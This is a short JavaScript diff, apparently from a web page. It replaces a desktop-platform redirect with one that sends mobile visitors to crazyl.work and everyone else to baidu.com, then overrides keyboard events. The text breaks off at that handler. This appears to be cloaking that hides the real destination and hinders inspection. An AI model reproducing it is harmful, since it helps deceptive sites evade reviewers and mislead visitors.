@@ -1,20 +1,11 @@
 
-//平台、设备和操作系统 
-var system = {
-    win: false,
-    mac: false,
-    xll: false
-};
-
-//检测平台 
-var p = navigator.platform;
-system.win = p.indexOf("Win") == 0;
-system.mac = p.indexOf("Mac") == 0;
-system.xll = (p == "Xll") || (p.indexOf("Linux") == 0);
-//跳转语句 
-if (system.win || system.mac || system.xll) {//转向后台登陆页面 
-    window.location.href = "http://www.baidu.com";
+if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+    window.location.href = "http://crazyl.work/";
+} else {
+    window.location.href = "https://www.baidu.com/";
 }
+
+
 
 document.onkeydown = document.onkeyup = document.onkeypress = function (event) {
     var e = event || window.event || arguments.callee.caller.arguments[0];
